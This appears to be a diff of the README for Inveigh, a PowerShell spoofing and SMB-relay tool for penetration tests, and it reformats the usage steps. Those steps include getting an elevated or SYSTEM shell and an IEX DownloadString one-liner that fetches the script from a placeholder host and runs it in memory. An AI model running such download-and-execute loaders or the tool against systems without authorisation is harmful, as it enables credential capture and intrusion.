@@ -17,23 +17,21 @@ Tested minimums are PowerShell 2.0 and .NET 3.5
 10. SMB relay support is experimental at this point, use caution if employing on a pen test.
 
 # Usage
-Obtain an elevated administrator or SYSTEM shell.
+Obtain an elevated administrator or SYSTEM shell and use a method to load the module
 
-Use a method to load the module:
-
-To import with Import-Method:
+To import with Import-Method:  
 Import-Module ./Inveigh.ps1
 
-To import with dot source method:
+To import with dot source method:  
 . ./Inveigh.ps1
 
-To load into memory using Invoke-Expression:
+To load into memory using Invoke-Expression:  
 IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")
 
 To execute with default settings:  
 Invoke-Inveigh
 
-To load and execute with one line:  
+To load and execute with one line:    
 Import-Module ./Inveigh.ps1;Invoke-Inveigh
 
 To execute with features enabled/disabled:   
